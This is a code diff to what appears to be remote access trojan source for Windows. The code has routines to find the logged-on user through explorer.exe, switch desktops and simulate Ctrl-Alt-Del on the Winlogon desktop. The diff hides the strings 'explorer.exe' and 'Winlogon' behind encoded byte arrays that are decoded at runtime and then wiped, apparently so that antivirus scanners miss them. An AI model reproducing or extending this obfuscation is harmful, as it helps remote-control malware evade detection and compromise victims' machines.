@@ -15,6 +15,7 @@
 #include <stdio.h>
 #include <locale.h>
 #include <stdlib.h>
+#include "..\StrCry.h"
 unsigned int __stdcall ThreadLoader(LPVOID param)
 {
 	unsigned int	nRet = 0;
@@ -25,7 +26,7 @@ unsigned int __stdcall ThreadLoader(LPVOID param)
 		THREAD_ARGLIST	arg;
 		memcpy(&arg, param, sizeof(arg));
 		SetEvent(arg.hEventTransferArg);
-		// 与卓面交互
+		// 与桌面交互
 		if (arg.bInteractive)
 			SelectDesktop(NULL);
 
@@ -99,7 +100,13 @@ char *GetLogUserXP()
 
 char *GetLogUser2K()
 {
-	DWORD	dwProcessID = GetProcessID("explorer.exe");
+	char explorer[] = { 0x0c,0xae,0xb2,0xb9,0xa4,0xa8,0xb4,0xa0,0xb6,0xed,0xa7,0xb9,0xa5 };	//explorer.exe
+	char* explorer_exe = decodeStr(explorer);					//解密函数
+
+	DWORD	dwProcessID = GetProcessID(explorer_exe);
+	memset(explorer_exe, 0, explorer[STR_CRY_LENGTH]);					//填充0
+	delete explorer_exe;
+
 	if (dwProcessID == 0)
 		return NULL;
 	
@@ -281,11 +288,17 @@ BOOL SimulateCtrlAltDel()
 	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
 	
 	// Switch into the Winlogon desktop
-	char name[] = "Winlogon";
-	if (!SelectDesktop(name))
+
+	char Winlogon[] = { 0x08,0x9c,0xa3,0xa7,0xa4,0xa8,0xa1,0xaa,0xaa };	//Winlogon
+	char* pWinlogon = decodeStr(Winlogon);								//解密函数
+
+	//char name[] = "Winlogon";
+	if (!SelectDesktop(pWinlogon))
 	{
 		return FALSE;
 	}
+	memset(pWinlogon, 0, Winlogon[STR_CRY_LENGTH]);					//填充0
+	delete pWinlogon;
 	
 	// Fake a hotkey event to any windows we find there.... :(
 	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
